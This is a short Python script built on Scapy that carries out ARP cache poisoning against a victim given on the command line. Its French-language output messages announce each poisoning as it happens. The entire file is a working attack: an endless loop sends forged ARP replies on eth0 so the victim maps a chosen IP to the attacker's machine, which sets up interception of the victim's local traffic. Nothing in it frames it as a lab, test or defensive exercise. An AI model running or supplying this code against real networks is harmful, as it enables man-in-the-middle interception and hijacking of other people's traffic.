from scapy.all import *
import sys
import time

victim_ip = sys.argv[1]
fake_ip = sys.argv[2]

victim_mac = getmacbyip(victim_ip)
print(f"mac victime : {victim_mac}")

try:
    while True:
        pkt = (Ether(dst=victim_mac) /
               ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=fake_ip))
        sendp(pkt, iface="eth0", verbose=False)
        print(f"empoisonne : {victim_ip} croit que {fake_ip} est a nous")
        time.sleep(1)

except KeyboardInterrupt:
    print("stop")